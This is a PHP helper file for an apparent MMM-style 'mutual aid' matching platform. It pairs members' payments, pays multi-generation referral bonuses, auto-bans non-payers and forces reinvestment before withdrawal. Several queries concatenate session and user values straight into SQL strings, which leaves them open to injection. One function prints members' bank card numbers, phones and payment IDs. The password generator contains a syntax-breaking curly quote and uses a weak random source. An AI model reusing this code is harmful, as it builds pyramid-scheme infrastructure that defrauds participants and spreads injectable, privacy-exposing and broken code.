        M('jsbz')->where(array('id'=>$ppmx['g_id']))->setField('jb',$tg['jb']);//还原jsbz卖出订单中的jb金额
        M('tgbz')->where(array('id'=>$ppmx['p_id']))->delete();//匹配了，没有付款完成的tgbz【买入记录的订单】删除
        M('ppdd')->where(array('id'=>$ppid))->delete();//删除当前的匹配记录
    }

}
//自动封号方法
function auto_ban_user()
{
    $list = M('ppdd')->where(array('zt'=>0))->select();//匹配成功，没有打款
    if(!$list){
        return;
    }
    foreach($list as$k=>$i){
        ban_users($i['id']);
    }

}

function last_help_to_money($user){


   $ret =  M('ppdd')->where(array('p_user'=>$user,'zt'=>2))->select();

    if(!$ret){

        return 0;
    }
    else{

        return $ret[0]['jb'];
    }

}




//等级领取代数限制 mark:设置领取代数
function offspring_limit($level)
{

    $c = M('config')->where(array('id'=>1))->find();
    $str = $c['level_limit'];
    $arry =array_filter(explode('|',$str));

    if(empty($arry[$level]))
    {
        return '';
    }else{

        return $arry[$level];
    }
}

function level_init($lev){

    if($lev == '创E组员'){


        return 0;

    }
    if($lev == '创E组长'){

        return 1;

    }
    if($lev == '创E主任'){

        return 2;

    }
    if($lev == '创E经理'){


        return 3;
    }
    if($lev == '创E总监'){

        return 4;

    }
    if($lev == '创E懂事'){


        return 5;
    }
    else{


        return 0;
    }

}


function dyc($pid,$user,$i){

    //动态收益参数设置
    //mark:设置领取代数奖励
    $c = M('config')->where(array('id'=>1))->find();
    $str = $c['level_limit_money'];
    $ary =array_filter(explode('|',$str));
    $user_jl = M('user_jl');
    $user_get = M('userget');
    $p = M('ppdd')->where(array('id'=>$pid))->field('jb')->find();
    $money = $p['jb'];
    $msg = '';

    if(empty($ary[$i]))
    {
        $ary[$i] = end($ary);
    }



    $user = M('user')->where(array('UE_account'=>$user['ue_accname']))->find();//当前用户上级


    if(!$user)
    {
        return 0;
    }
    //等级领取代数限制
    $flag = offspring_limit(level_init($user['levelname']));



        if($flag>$i && $flag<5){

              /*  if($money>last_help_to_money($user['ue_account'])){
                    $money = last_help_to_money($user['ue_account']);
                    $msg = '(燃烧触发)';
                }*/

            $data['user'] = $user['ue_account'];
            $data['note'] = '直推奖';//详情
            $data['jb']   = $money; //匹配金额
            $data['jj']   = ceil($money*$ary[$i]);//奖励
            $data['r_id'] = $pid;//匹配单号
            $data['date'] = date('Y-m-d H:i:s', time());
            M('user')->where(array('UE_account'=>$user['ue_account']))->setInc('tj_he',intval($data['jj'])); //增加奖励
            $user_jl->data($data)->add();//插入奖励记录
            //银行存单记录
            $money_bank["UG_account"] = $user['ue_account']; // 登入轉出賬戶
            $money_bank["UG_type"] = 'tj_he';
            $money_bank["UG_allGet"] = $user['tj_he']; // 金幣
            $money_bank["UG_money"] = '+' . $data['jj']; //奖金
            $money_bank["UG_balance"] = $user['tj_he']+$data['jj']; // 當前推薦人的金幣餘額
            $money_bank["UG_dataType"] = 'tqjl'; //
            $money_bank["UG_note"] = ($i+1).'直推励:'.$ary[$i].$msg;
            $money_bank["jsbzID"] = $pid;
            $money_bank["UG_getTime"] = date('Y-m-d H:i:s', time()); //money_bank
            $user_get->data(($money_bank))->add();

           }
    if($flag>=5){

      /*  if($money>last_help_to_money($user['ue_account'])){
            $money = last_help_to_money($user['ue_account']);
            $msg = '(燃烧触发)';
        }*/

        $data['user'] = $user['ue_account'];
        $data['note'] = '直推奖';//详情
        $data['jb']   = $money; //匹配金额
        $data['jj']   = ceil($money*end($ary));//奖励
        $data['r_id'] = $pid;//匹配单号
        $data['date'] = date('Y-m-d H:i:s', time());
        M('user')->where(array('UE_account'=>$user['ue_account']))->setInc('tj_he',intval($data['jj'])); //增加奖励
        $user_jl->data($data)->add();//插入奖励记录
        //银行存单记录
        $money_bank["UG_account"] = $user['ue_account']; // 登入轉出賬戶
        $money_bank["UG_type"] = 'tj_he';
        $money_bank["UG_allGet"] = $user['tj_he']; // 金幣
        $money_bank["UG_money"] = '+' . $data['jj']; //奖金
        $money_bank["UG_balance"] = $user['tj_he']+$data['jj']; // 當前推薦人的金幣餘額
        $money_bank["UG_dataType"] = 'tqjl'; //
        $money_bank["UG_note"] = ($i+1).'直推奖励:'.$ary[$i].$msg;
        $money_bank["jsbzID"] = $pid;
        $money_bank["UG_getTime"] = date('Y-m-d H:i:s', time()); //money_bank
        $user_get->data(($money_bank))->add();

    }
    $i = $i+1;
    dyc($pid,$user,$i);
}
	
function getlimitpay($id){

     if(C('tiqian_time') > 0 && C('tiqian_lx') >0){

        //申请买入时间

        $dakuan = M('ppdd')->where(array('id'=>$id,'zt'=>'1'))->find(); //配对信息

        $peidui_time = strtotime($dakuan['date']);  //---------------------->配对时间
        $dakuan_time = strtotime($dakuan['date_hk']);  //----------------------->打款时间
        $diffTime =  $peidui_time+3600*C('tiqian_time') -$dakuan_time;       //排队时间+后台设置提前时间 - 打款时间

        if($diffTime>0 ){
            M('tgbz')->where(array('id'=>$dakuan['p_id']))->save(array('in_time'=>1));

            $tiqian_lx = C('tiqian_lx'); 
            $six_hour_lx = $dakuan['jb']*$tiqian_lx/100;

            $users = M('user')->where(array('UE_account' => $dakuan['p_user']))->find();
            M('user')->where(array('UE_account' => $dakuan['p_user']))->setInc('jifen', $six_hour_lx);

            $note = "提前".C('tiqian_time')."小时打款奖励";

            $data["UG_account"] = $dakuan['p_user']; // 登入轉出賬戶
            $data["UG_type"] = 'jb';
            $data["UG_allGet"] = $users['jifen']; // 金幣
            $data["UG_money"] = '+' . $six_hour_lx; //
            $data["UG_balance"] = $users['jifen']+$six_hour_lx; // 當前推薦人的金幣餘額
            $data["UG_dataType"] = 'tiqian_lx'; 
            $data["UG_note"] = $note; // 诚信奖說明
            $data["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
            $data["varid"] = 0;
            M('userget')->add($data);

			return true;
        }
     }
  }

function ismobile() {
    // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
    if (isset ($_SERVER['HTTP_X_WAP_PROFILE']))
        return true;
    
    //此条摘自TPM智能切换模板引擎，适合TPM开发
    if(isset ($_SERVER['HTTP_CLIENT']) &&'PhoneClient'==$_SERVER['HTTP_CLIENT'])
        return true;
    //如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
    if (isset ($_SERVER['HTTP_VIA']))
        //找不到为flase,否则为true
        return stristr($_SERVER['HTTP_VIA'], 'wap') ? true : false;
    //判断手机发送的客户端标志,兼容性有待提高
    if (isset ($_SERVER['HTTP_USER_AGENT'])) {
        $clientkeywords = array(
            'nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile'
        );
        //从HTTP_USER_AGENT中查找手机浏览器的关键字
        if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
            return true;
        }
    }
    //协议法，因为有可能不准确，放到最后判断
    if (isset ($_SERVER['HTTP_ACCEPT'])) {
        // 如果只支持wml并且不支持html那一定是移动设备
        // 如果支持wml和html但是wml在html之前则是移动设备
        if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
            return true;
        }
    }
    return false;
}

function get_dj($r_id)
{
	$ppdd = M('ppdd')->where(array('id' => $r_id))->find();
	$tgbz = M('tgbz')->where(array('id' => $ppdd['p_id']))->find();
	return $tgbz['dj'];
}
function get_had_zc($r_id)
{
	$ppdd = M('ppdd')->where(array('id' => $r_id))->find();
	$tgbz = M('tgbz')->where(array('id' => $ppdd['p_id']))->find();
	return $tgbz['had_zc'];
}

function getTotalUserCount()
{
   $count = M('user')->where ("1=1")->count () - 1; 
   return $count  == null ? 0 :$count;
}
function getYestodayUserCount()
{
    $count = M('user')->where ("TO_DAYS( NOW( ) ) - TO_DAYS( UE_regTime) <= 1")->count (); 
   return $count  == null ? 0 :$count;
}
function getTodayUserCount()
{
   $count = M('user')->where ("to_days(UE_regTime) = to_days(now())")->count ();
   return $count  == null ? 0 :$count;
}
function get7TodaysUserCount()
{
   $count = M('user')->where ("DATE_SUB(CURDATE(), INTERVAL 7 DAY) <= date(UE_regTime)")->count (); 
   return $count == null ? 0 :$count;
}

function getTotalPDSum()
{
   $sum = M('tgbz')->where ("1=1")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}

function getYestodayPDSum()
{
   $sum = M('tgbz')->where ("TO_DAYS( NOW( ) ) - TO_DAYS( date) <= 1")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}

function getNoPPPDSum()
{
   $sum = M('tgbz')->where ("zt=0")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}

function getTodayPDSum()
{
   $sum = M('tgbz')->where ("to_days(date) = to_days(now())")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}

function get7TodaysPDSum()
{
   $sum = M('tgbz')->where ("DATE_SUB(CURDATE(), INTERVAL 7 DAY) <= date(date)")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}


function getTotalTXSum()
{
   $sum = M('jsbz')->where ("1=1")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}

function getYestodayTXSum()
{
   $sum = M('jsbz')->where ("TO_DAYS( NOW( ) ) - TO_DAYS( date) <= 1")->sum ('jb');  
   return $sum == null ? 0 :$sum;
}

function getNoPPTXSum()
{
   $sum = M('jsbz')->where ("zt = 0")->sum ('jb');  
   return $sum == null ? 0 :$sum;
}

function getTodayTXSum()
{
   $sum = M('jsbz')->where ("to_days(date) = to_days(now())")->sum ('jb');
   return $sum == null ? 0 :$sum;
}

function get7TodaysTXSum()
{
   $sum = M('jsbz')->where ("DATE_SUB(CURDATE(), INTERVAL 7 DAY) <= date(date)")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}

function replace_xing($var)
{
	return str_replace(substr($var,3,4),'****',$var);
}
function getInBtn($id)
{   
	$user = M('user')->where(array('UE_account' => $_SESSION['uname']))->find();
	$priority = $user['priority'];

    if($priority==0 && getNIEnabled($id))
	   return "<a href='/Home/PData/jsbzlist/tgbzid/$id' type='button' class='btn btn-info btn-xs addmsg'>普通进场</a>";
	if($priority==1 && getSIEnabled($id))
	   return "<a href='/Home/PData/jsbzlist/tgbzid/$id' type='button' class='btn btn-info btn-xs addmsg'>高级进场</a>";
}

function getNIEnabled($id)
{
	$tgbz=M('tgbz')->where(array('id'=>$id))->find();
	$tgbz_tm  =  strtotime($tgbz['date']);
	$n_in_startbtn = strtotime(C('n_in_startbtn'));
    $n_in_endbtn = strtotime(C('n_in_endbtn'));

    if($tgbz_tm > $n_in_startbtn &&  $tgbz_tm < $n_in_endbtn){ 
       return true;
	}else
	   return false;
}

function getSIEnabled($id)
{
	$tgbz=M('tgbz')->where(array('id'=>$id))->find();
	$tgbz_tm  =  strtotime($tgbz['date']);
	$s_in_startbtn = strtotime(C('s_in_startbtn'));
    $s_in_endbtn = strtotime(C('s_in_endbtn'));
    if($tgbz_tm > $s_in_startbtn &&  $tgbz_tm < $s_in_endbtn){ 
       return true;
	}else
	   return false;
}


/**
  * 0不可进场
  * 1普通进场
  * 2高级进场
  */
function getUserInEnabled()
{
    $now_time = time();
	$user = M('user')->where(array('UE_account' => $_SESSION['uname']))->find();

	if($user['priority'] == 0)
	{
		$n_in_start = strtotime(C('n_in_start'));
        $n_in_end = strtotime(C('n_in_end'));
        if($now_time > $n_in_start &&  $now_time < $n_in_end){ 
            return 1;
	    }
	    else
		{
			return 0;
		}
	}elseif($user['priority'] == 1)
	{
		$s_in_start = strtotime(C('s_in_start'));
        $s_in_end = strtotime(C('s_in_end'));
        if($now_time > $s_in_start &&  $now_time < $s_in_end){ 
            return 2;
	    }
	    else
		{
			return 0;
		}
	}
}

function getUserAddByCircle()
{
   $get_pp_suc_count = getUserPPSucCount();

   if($get_pp_suc_count >  C('max_tg_add_circle'))
	   $get_pp_suc_count =  C('max_tg_add_circle');
   if(C('tg_add_circle') > 0)
      return intval($get_pp_suc_count / C('tg_add_circle')) * C('tg_add_circle_money');
   return 0;

}

//排单金额不小于上一轮的百分比设置：
function get_tg_min_compare_last()
{
	 $last_paidan = M('tgbz')->where("id = mainid and user='" . $_SESSION['uname'] . "'  ")->order('date desc')->limit(1)->select();
     $last_amount = $last_paidan[0]['total'];
     $limit_amount = $last_amount * C('tx_relative') / 100;
	 return $limit_amount;
}

//买出金额不小于上一轮的百分比设置：
function get_js_min_compare_last()
{
	 $last = M('tixian')->where("zffs = 2 and UG_account='" . $_SESSION['uname'] . "' ")->order('addtime desc')->limit(1)->select();
     $last_amount = $last[0]['tx_money'];
     $limit_amount = $last_amount * C('jsbz_relative') / 100;
	 return $limit_amount;
}

function get_userinfo_from_user($username)
{
	$user = M('user')->where("UE_account = " . $username)->find();
	$tjr = M('user')->where("UE_accname = " . $user['ue_accname'])->find();
	//replace_xing
	return  
		  "会员帐号：" . ($user['ue_account']) . "</br>"
		  ."昵称：" . $user['ue_theme'] . "</br>"
		  ."推荐人：" . ($user['ue_accname']) . "</br>"
		  ."推荐电话：" . ($tjr['ue_phone']) . "</br>"
		  ."电话：" . $user['ue_phone'] . "</br>"
		  ."支付宝：" . $user['zfb'] . "</br>"
		  ."微信：" . $user['weixin'] . "</br>"
		  ."银行卡号：" . $user['yhzh'] . "</br>"
		  ."开户银行：" . $user['yhmc'] . "</br>"
		  ."云支付账号：" . $user['yzf'] . "</br>";;
}


//充值,提现
function ppdd_add($p_id,$g_id){

	 $g_user1 = M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->find();
	 $p_user1=M('tgbz')->where(array('id'=>$p_id))->find();

	 M('user')->where(array('UE_account'=>$p_user1['user']))->save(array('pp_user'=>$g_user1['user']));
	 M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));

	 $get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();

	// echo $g_user['id'].'<br>';
	$data_add['p_id']=$p_user1['id'];
	$data_add['g_id']=$g_user1['id'];
	$data_add['jb']=$g_user1['jb'];
	$data_add['p_user']=$p_user1['user'];
	$data_add['g_user']=$g_user1['user'];
	$data_add['date']=date ( 'Y-m-d H:i:s', time () );
	$data_add['zt']='0';
	$data_add['priority']=$get_user['priority'];
	$data_add['pic']='0';
	$data_add['zffs1']=$p_user1['zffs1'];
	$data_add['zffs2']=$p_user1['zffs2'];
	$data_add['zffs3']=$p_user1['zffs3'];
	M('tgbz')->where(array('id'=>$p_id,'zt'=>'0'))->save(array('zt'=>'1'));
	M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->save(array('zt'=>'1','ppjb'=>$g_user1['jb']));
   // echo $p_user1['user'].'<br>';
	if(M('ppdd')->add($data_add)){
		$where=array();
		$starttime = date('Y-m-d 00:00:01', time());
		$where['date'] =array('GT',$starttime);
		$where['g_user'] = $g_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1 && C('sms_open_pp')=="1") {
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
            //sendSMS('13119710425','你好，这里是测试短信的接口【富怡资本】','','http://api.sms.cn/sms/',1);
            //sendSMS($get_user['ue_phone'],"",'SMS_165386286');
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
		}

		unset($where['g_user']);
		$where['p_user'] = $p_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1 && C('sms_open_pp')=="1"){ 
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您申请提供的订单已匹配，请及时处理【" . C('sms_sign') . "】");
            //sendSMS($get_user['ue_phone'],"",'SMS_165386286');
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您申请提供的订单已匹配，请及时处理【" . C('sms_sign') . "】");
		}
		return true;	
	}else{
		return false;
	}
}


function check_tx_status()
{
	if(C('txstatus')==0)
	    return_die_ajax('提现已关闭');
	$now_time = time();
	$tx_start = strtotime(C('tx_start'));
    $tx_end = strtotime(C('tx_end'));

    /*
    //判断红利积分
    $user_jj = M('user_jj');
    $map_jj['zt'] =  array(in, array('0','1'));
    $map_jj['user'] = $_SESSION['uname'];
    $map_jj['isprepay'] = 0;
    $map_jj['_string'] = "p_id = main_p_id";
    user_jj_zong_lx();
    $jj_count = $user_jj->where($map_jj)->count();
    */


    if($now_time > $tx_start &&  $now_time < $tx_end)
	{ 
		//积分钱包为负数不可提现
	    $jifen = get_userinfo($_SESSION['uname'],'jifen');
	    if($jifen < 0)
		     return_die_ajax('积分钱包为负数不可提现!');

		//强制复投，没有打款且无在且无在冻结期的订单无法提现
		if(C('force_tgbz') == '1')
		{
		    /*
	       if(get_dj_count() == 0)
		      return_die_ajax('无在冻结期的订单无法提现,请复投后再提现!');
		    */
            if(new_get_dj_count() == 0)
                return_die_ajax('无在冻结期的订单无法提现,请复投后再提现!');
		}

        return true;
	}
    else
	{
		if ($now_time < $tx_start)
		{
			return_die_ajax("不好意思今天提现时间还早哦！提现时间为" . C('tx_start') . "到" . C('tx_end'));
        } else{
			return_die_ajax('很遗憾你已经错过了提现时间');
        } 
	}
                
}

function get_yzf($jb)
{
	return $jb * 1.15;
}

function getTodayJHMUsedCount()
{
   $count = M('jhm_log')->where ("type='jh' and to_days(date) = to_days(now())")->count(); 
   return $count == null ? 0 :$count;
}

function check_all_chaifen_tx_enabled($mainid)
{  
   if($mainid == 0)
	   return true;
   $main_pp = M('ppdd')->where(array('p_id'=>$mainid))->find();
   if($main_pp['zt'] <> 2)
	   return false;
   $tgbz_list = M('tgbz')->where(array('mainid'=>$mainid))->select();
   foreach ($tgbz_list as $key => $item)
   {
	   $pp_item = M('ppdd')->where(array('p_id'=>$item['id']))->find();
	   if($pp_item['zt'] <> 2)
	   {
		   return false;
	   }
   }

   return true;
}

////除了自己以外的都提出了
function check_all_chaifen_tx_part_zc($mainid,$id)
{
   if($mainid == 0)
	   return true;
   $tgbz_list = M('tgbz')->where('mainid = ' . $mainid . ' and id <> ' . $id)->select();
   foreach ($tgbz_list as $key => $item)
   {
	  if($item['had_zc'] == 0)
		  return false;
   }
   return true;
}

function generate_password( $length = 8 ) { 
// 密码字符集，可任意添加你需要的字符 
$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|'; 
$password = ”; 
for ( $i = 0; $i < $length; $i++ ) 
{ 
// 这里提供两种字符获取方式 
// 第一种是使用 substr 截取$chars中的任意一位字符； 
// 第二种是取字符数组 $chars 的任意元素 
// $password .= substr($chars, mt_rand(0, strlen($chars) – 1), 1); 
$password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; 
} 
return $password; 
} 
?> 